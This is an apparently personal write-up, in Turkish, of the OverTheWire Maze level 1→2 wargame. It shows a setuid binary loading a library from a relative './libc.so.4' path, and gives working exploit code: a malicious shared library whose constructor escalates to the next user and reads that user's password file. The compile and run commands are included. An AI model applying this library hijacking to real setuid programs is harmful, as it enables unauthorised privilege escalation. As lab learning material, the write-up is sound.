# OverTheWire — Maze Level 1 → 2

> Hedef: `maze1`'den `maze2` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: **Göreli yollu paylaşımlı kütüphane** (`DT_NEEDED = ./libc.so.4`) → CWD'den kütüphane enjeksiyonu (library hijacking).

---

## 1. Bağlantı & İlk Bakış
```bash
ssh maze1@maze.labs.overthewire.org -p 2225
/maze/maze1
# error while loading shared libraries: ./libc.so.4: cannot open shared object file
```
Binary'nin `main`'i aslında sadece `puts("Hello World!")` yapıyor — sömürülecek mantık yok. İpucu hata mesajında.

## 2. Analiz (`readelf -d`)
```
0x01 (NEEDED)  Shared library: [./libc.so.4]   <-- GÖRELİ YOL!
0x01 (NEEDED)  Shared library: [libc.so.6]
```
Binary, `./libc.so.4` adında bir kütüphaneye bağlı. Baştaki `./` → dinamik yükleyici onu **çalışma dizininden (CWD)** arar. Setuid binary olduğu için (`-r-sr-x--- maze2 maze1`), yüklenen kütüphanenin kodu **maze2 yetkisiyle** çalışır.

## 3. Zafiyet
Setuid bir programın, **saldırganın yazabildiği bir dizinden** kütüphane yüklemesi = doğrudan kod çalıştırma. Kütüphanenin `constructor`'ı `main`'den **önce**, yükleme sırasında koşar → maze2 olarak istediğimizi yaparız.

> Dikkat: ilk denemede `Permission denied` aldım. Sebebi AT_SECURE değil, **dizin izniydi**: `mktemp -d` 0700/maze1 dizin yapar, binary euid maze2 ile çalıştığı için o dizine giremez. Dizini `711`, `.so`'yu `755` yapmak çözer.

## 4. Exploit
Kötü niyetli `./libc.so.4` (constructor'lı) derle, yazılabilir bir dizinde çalıştır:
```c
// fake.c
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))
static void go(void){
    setresuid(geteuid(),geteuid(),geteuid());   // ruid=euid=maze2 sabitle
    system("id; cat /etc/maze_pass/maze2");
    _exit(0);
}
```
```bash
D=/tmp/work; mkdir -p $D; chmod 711 $D; cd $D
gcc -m32 -shared -fPIC -o libc.so.4 fake.c
chmod 755 libc.so.4
/maze/maze1            # CWD'deki sahte libc.so.4 yüklenir → constructor maze2 olarak koşar
# uid=15002(maze2) ... <maze2 şifresi>
```
Gerçek `libc.so.6` ikinci NEEDED olarak yüklendiği için `system`/`setresuid` çağrıları sorunsuz çözülür. `puts`/`__libc_start_main` lazy-binding olduğundan, biz `main`'e ulaşmadan `_exit` ettiğimiz için sahte kütüphanenin onları sağlamasına gerek yok.

## Dersler
| Konu | Not |
|------|-----|
| Göreli `DT_NEEDED` | `./lib...` veya RPATH `$ORIGIN`/`.` → CWD'den yükleme; setuid'de ölümcül |
| Library hijacking | Yazılabilir dizin + setuid yükleyici = maze2 olarak kod |
| `constructor` | `__attribute__((constructor))` `main`'den önce, yükleme anında çalışır |
| İzin tuzağı | Setuid kurban hedef dizine **euid** ile girer; dizin `o+x` (`711`), dosya `o+r` olmalı |
| Neden LD_PRELOAD değil | Setuid binary'ler AT_SECURE → `LD_PRELOAD`/`LD_LIBRARY_PATH` yok sayılır; ama binary'ye **gömülü** göreli yol uygulanır |
